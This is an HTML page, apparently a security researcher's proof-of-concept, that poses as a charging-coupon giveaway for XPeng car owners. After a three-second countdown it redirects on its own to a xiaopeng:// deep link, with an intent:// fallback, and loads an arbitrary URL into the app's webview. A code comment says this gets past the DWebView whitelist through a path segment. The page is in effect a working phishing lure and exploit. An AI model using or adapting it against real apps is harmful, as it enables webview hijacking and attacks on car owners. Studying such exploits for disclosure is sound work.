<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>领取您的专属充电券</title>
<style>
html,body{height:100%;margin:0}
body{font-family:-apple-system,sans-serif;background:#fff;color:#333;position:relative}
#full{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;text-decoration:none;color:#333;background:#fff}
#full:active{background:#eef4ff}
.btn{background:#00b2ff;color:#fff;border-radius:12px;padding:26px 44px;font-size:20px;margin-top:18px}
#cd{position:fixed;top:0;left:0;right:0;background:#fff8e1;border-bottom:1px solid #ffe082;padding:10px 14px;font-size:14px;color:#7a5c00;text-align:center;z-index:5}
#cd b{color:#c00;font-size:18px}
#cdCancel{color:#00b2ff;margin-left:10px;text-decoration:underline}
#st{position:fixed;left:0;right:0;bottom:60px;text-align:center;font-size:13px;color:#c00;padding:4px}
</style>
</head>
<body>
<div id="cd">⏳ <b id="cdNum">3</b> 秒后自动打开小鹏汽车App（国内版）<a id="cdCancel" href="#">取消</a></div>
<a id="full" href="#">
  <h2>⚡ 车主专属充电福利</h2>
  <p style="color:#777">点击屏幕任意位置<br>在小鹏汽车App中查看专属充电券</p>
  <span class="btn">立即领取</span>
</a>
<div id="st"></div>
<script>
/* ══ 国内版 DeepLink PoC 唤起载体 ══
 * 目标页: x.xiaopeng.com/index.html（路径段绕过 DWebView 白名单）
 * scheme: xiaopeng://www.xiaopeng.com/common/webview?url=<enc>
 * 包名:   com.xiaopeng.mycarinfo（国内版）
 */
var PAGE   = "http://localhost:18765/localhost-poc.html";   /* 本地桥全链版 */
var SCHEME = "xiaopeng://www.xiaopeng.com/common/webview?url=" + encodeURIComponent(PAGE);
var INTENT = "intent://www.xiaopeng.com/common/webview?url=" + encodeURIComponent(PAGE) +
  "#Intent;scheme=xiaopeng;package=com.xiaopeng.mycarinfo;end;";
var full = document.getElementById('full');
full.href = SCHEME;

function mark(tag){
  document.title = '已触发' + tag;
  document.getElementById('st').textContent = '✅ 已触发 ' + tag + '（若未跳转说明该浏览器拦截了 scheme）';
}
full.addEventListener('click', function(){ mark('按钮点击'); });

/* ── 倒计时自动跳转 ── */
var n = 3, timer = null, cancelled = false;
var cdNum = document.getElementById('cdNum');
document.getElementById('cdCancel').addEventListener('click', function(e){
  e.preventDefault(); cancelled = true; clearInterval(timer);
  document.getElementById('cd').innerHTML = '已取消自动跳转——请点击下方按钮手动打开';
});
timer = setInterval(function(){
  if (cancelled) return;
  n--; cdNum.textContent = n;
  if (n <= 0) {
    clearInterval(timer);
    document.getElementById('cd').innerHTML = '🚀 正在唤起小鹏汽车App（国内版）…';
    mark('自动跳转');
    location.href = SCHEME;
    setTimeout(function(){
      if (!document.hidden && !cancelled) {
        mark('自动跳转(intent回退)');
        location.href = INTENT;
      }
    }, 1800);
    setTimeout(function(){
      if (!document.hidden && !cancelled) {
        document.getElementById('cd').innerHTML =
          '⚠️ 此浏览器拦截了自动跳转（需用户手势）——点击下方任意按钮即可打开';
      }
    }, 4000);
  }
}, 1000);

document.addEventListener('visibilitychange', function(){
  if (document.hidden) mark('自动跳转(成功唤起)');
});
</script>
</body>
</html>
